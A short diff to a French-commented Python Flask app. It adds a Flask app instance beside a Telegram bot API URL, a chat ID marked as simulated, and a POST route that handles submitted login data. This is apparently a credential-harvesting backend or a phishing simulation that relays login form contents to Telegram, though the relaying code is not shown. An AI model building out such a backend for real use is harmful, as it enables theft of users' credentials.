@@ -12,6 +12,8 @@ TELEGRAM_CHAT_ID_SIMULE = "1949276292"
 # L'URL de l'API de Telegram pour envoyer des messages
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_SIMULE}/sendMessage"
 
+app = Flask(__name__)
+
 # --- ROUTE DE TRAITEMENT DU FORMULAIRE ---
 @app.route('/traitement_connexion', methods=['POST'])
 def handle_login_data():
